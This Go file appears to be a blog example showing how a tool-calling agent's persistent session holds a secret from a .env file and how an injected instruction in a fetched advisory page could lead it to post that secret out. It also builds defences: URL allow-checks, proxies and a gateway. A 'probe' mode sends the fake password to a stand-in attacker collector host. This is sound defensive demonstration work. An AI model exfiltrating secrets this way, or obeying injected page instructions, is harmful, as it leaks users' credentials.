// agent is a small tool-calling agent with one persistent session, the shape
// of the scenario in "AI Agent Sessions Are a Data Store Nobody Designed":
// early on a tool reads a secret, later the agent reads a page that carries an
// injected instruction, and the whole history goes back to the model each
// turn.
//
// It has three tools:
//
//   - read_file reads from the project it works on (here, a fixed .env)
//   - fetch reads a web page, directly or through FETCHER_URL
//   - http_post writes to a URL, directly or through WRITE_PROXY
//
// Where each one goes is configuration, not code: the same binary runs with
// its doors open and with them closed.
//
//	agent run     plays the scenario
//	agent probe   tries the ways around the closed doors
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/davideimola/blog-examples/two-doors/internal/chat"
)

// The project the agent works on. The password is the secret that ends up in
// the session on the first turn and stays there.
const dotenv = `DATABASE_URL=postgres://app:hunter2@db-old.internal:5432/app
PAYMENTS_API_KEY=pk_live_51NOTREAL
`

type config struct {
	modelURL string // OpenAI-compatible base URL: the provider, or the gateway
	modelKey string // empty when the gateway holds the key
	model    string
	fetcher  string // empty: fetch directly
	proxy    string // empty: post directly
	// userURLs makes fetch refuse any URL the user did not type. The model
	// can still ask for one; the tool says no before anything leaves.
	userURLs bool
}

func main() {
	log.SetFlags(0)
	cfg := config{
		modelURL: must("MODEL_URL"),
		modelKey: os.Getenv("MODEL_API_KEY"),
		model:    envOr("MODEL", "small"),
		fetcher:  os.Getenv("FETCHER_URL"),
		proxy:    os.Getenv("WRITE_PROXY"),
		userURLs: os.Getenv("FETCH_USER_URLS_ONLY") == "true",
	}
	// kindnet decides on a new pod's first packets before it has learned
	// the pod's address, and lets them through. The agent waits it out so
	// the demo shows the policy, not the race.
	if d, err := time.ParseDuration(os.Getenv("START_DELAY")); err == nil {
		time.Sleep(d)
	}
	cmd := "run"
	if len(os.Args) > 1 {
		cmd = os.Args[1]
	}
	switch cmd {
	case "run":
		run(cfg)
	case "probe":
		probe(cfg)
	default:
		log.Fatalf("unknown command %q (run | probe)", cmd)
	}
}

func run(cfg config) {
	a := &agent{cfg: cfg, http: &http.Client{Timeout: 5 * time.Second}}
	log.Printf("model: %s (%s)", cfg.modelURL, keyNote(cfg.modelKey))
	log.Printf("fetch: %s", orDirect(cfg.fetcher))
	log.Printf("post:  %s", orDirect(cfg.proxy))
	if cfg.userURLs {
		log.Printf("fetch accepts only URLs the user typed")
	}
	log.Printf("")

	log.Printf("--- turn 3")
	a.turn("Why is the deploy failing?")
	log.Printf("\n--- turn 40, a week later, same session")
	a.turn("Summarize this advisory for me: http://advisories.internet.svc.cluster.local/cve-2026-0042")
}

type agent struct {
	cfg     config
	http    *http.Client
	session []chat.Message
}

func (a *agent) turn(prompt string) {
	log.Printf("user: %s", prompt)
	a.session = append(a.session, chat.Message{Role: "user", Content: prompt})
	for range 6 {
		msg, err := a.complete()
		if err != nil {
			log.Printf("model: %v", err)
			return
		}
		a.session = append(a.session, msg)
		if len(msg.ToolCalls) == 0 {
			log.Printf("agent: %s", msg.Content)
			return
		}
		for _, c := range msg.ToolCalls {
			out := a.tool(c.Function)
			a.session = append(a.session, chat.Message{
				Role: "tool", ToolCallID: c.ID, Name: c.Function.Name, Content: out,
			})
		}
	}
}

func (a *agent) complete() (chat.Message, error) {
	body, _ := json.Marshal(chat.Request{Model: a.cfg.model, Messages: a.session, Tools: tools})
	req, _ := http.NewRequest(http.MethodPost, a.cfg.modelURL+"/chat/completions", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	if a.cfg.modelKey != "" {
		req.Header.Set("Authorization", "Bearer "+a.cfg.modelKey)
	}
	resp, err := a.http.Do(req)
	if err != nil {
		return chat.Message{}, err
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != http.StatusOK {
		return chat.Message{}, fmt.Errorf("%s: %s", resp.Status, bytes.TrimSpace(raw))
	}
	var out chat.Response
	if err := json.Unmarshal(raw, &out); err != nil || len(out.Choices) == 0 {
		return chat.Message{}, fmt.Errorf("bad response: %s", raw)
	}
	return out.Choices[0].Message, nil
}

func (a *agent) tool(f chat.Function) string {
	var args map[string]string
	json.Unmarshal([]byte(f.Arguments), &args)
	var out string
	switch f.Name {
	case "read_file":
		out = dotenv
		log.Printf("tool read_file(%s): %d bytes, now in the session", args["path"], len(out))
		return out
	case "fetch":
		if a.cfg.userURLs && !a.typedByUser(args["url"]) {
			out = "error: fetch refused, the user never gave this URL"
		} else {
			out = a.fetch(args["url"])
		}
		log.Printf("tool fetch(%s): %s", short(args["url"]), firstLine(out))
	case "http_post":
		out = a.post(args["url"], args["body"])
		log.Printf("tool http_post(%s): %s", short(args["url"]), firstLine(out))
	default:
		out = "error: unknown tool"
	}
	return out
}

// typedByUser reports whether a URL appears, exactly, in something the user
// wrote in this session. Anything the model composed, a link it found in a
// page or an address with data appended to it, fails this check.
func (a *agent) typedByUser(u string) bool {
	for _, m := range a.session {
		if m.Role == "user" && strings.Contains(m.Content, u) {
			return true
		}
	}
	return false
}

func (a *agent) fetch(target string) string {
	u := target
	if a.cfg.fetcher != "" {
		u = a.cfg.fetcher + "/fetch?url=" + url.QueryEscape(target)
	}
	resp, err := a.http.Get(u)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != http.StatusOK {
		return fmt.Sprintf("error: %s", resp.Status)
	}
	return string(b)
}

func (a *agent) post(target, body string) string {
	c := a.http
	if a.cfg.proxy != "" {
		p, _ := url.Parse(a.cfg.proxy)
		c = &http.Client{Timeout: 5 * time.Second, Transport: &http.Transport{Proxy: http.ProxyURL(p)}}
	}
	resp, err := c.Post(target, "text/plain", strings.NewReader(body))
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		return fmt.Sprintf("error: %s", resp.Status)
	}
	return "ok: " + resp.Status
}

// probe tries what an attacker who controls the agent's process would try
// once the tools are closed: skip the proxy, skip the gateway, ask for a model
// the gateway doesn't route.
func probe(cfg config) {
	c := &http.Client{Timeout: 3 * time.Second}
	try := func(what string, req *http.Request) {
		resp, err := c.Do(req)
		if err != nil {
			log.Printf("%-48s blocked: %v", what, shortErr(err))
			return
		}
		resp.Body.Close()
		log.Printf("%-48s %s", what, resp.Status)
	}

	post, _ := http.NewRequest(http.MethodPost, "http://collector.attacker.svc.cluster.local/in", strings.NewReader("hunter2"))
	try("POST to the collector, skipping the proxy", post)

	direct, _ := http.NewRequest(http.MethodPost, "http://provider.internet.svc.cluster.local/v1/chat/completions",
		strings.NewReader(`{"model":"small","messages":[{"role":"user","content":"hi"}]}`))
	try("call the provider directly, skipping the gateway", direct)

	other, _ := http.NewRequest(http.MethodPost, cfg.modelURL+"/chat/completions",
		strings.NewReader(`{"model":"some-other-model","messages":[{"role":"user","content":"hi"}]}`))
	other.Header.Set("Content-Type", "application/json")
	try("ask the gateway for a model it doesn't route", other)
}

var tools = []chat.Tool{
	def("read_file", "Read a file from the project", "path"),
	def("fetch", "Read a web page", "url"),
	def("http_post", "Send data to a URL", "url", "body"),
}

func def(name, desc string, params ...string) chat.Tool {
	props := map[string]any{}
	for _, p := range params {
		props[p] = map[string]string{"type": "string"}
	}
	return chat.Tool{Type: "function", Function: chat.ToolDef{
		Name: name, Description: desc,
		Parameters: map[string]any{"type": "object", "properties": props, "required": params},
	}}
}

func must(k string) string {
	v := os.Getenv(k)
	if v == "" {
		log.Fatalf("%s is required", k)
	}
	return v
}

func envOr(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

func keyNote(k string) string {
	if k == "" {
		return "no API key in this pod"
	}
	return "API key in this pod"
}

func orDirect(s string) string {
	if s == "" {
		return "direct"
	}
	return "through " + s
}

func short(u string) string {
	if len(u) > 70 {
		return u[:67] + "..."
	}
	return u
}

func firstLine(s string) string {
	s = strings.TrimSpace(s)
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		s = s[:i] + " ..."
	}
	return short(s)
}

func shortErr(err error) string {
	s := err.Error()
	if i := strings.LastIndex(s, ": "); i >= 0 {
		return s[i+2:]
	}
	return s
}
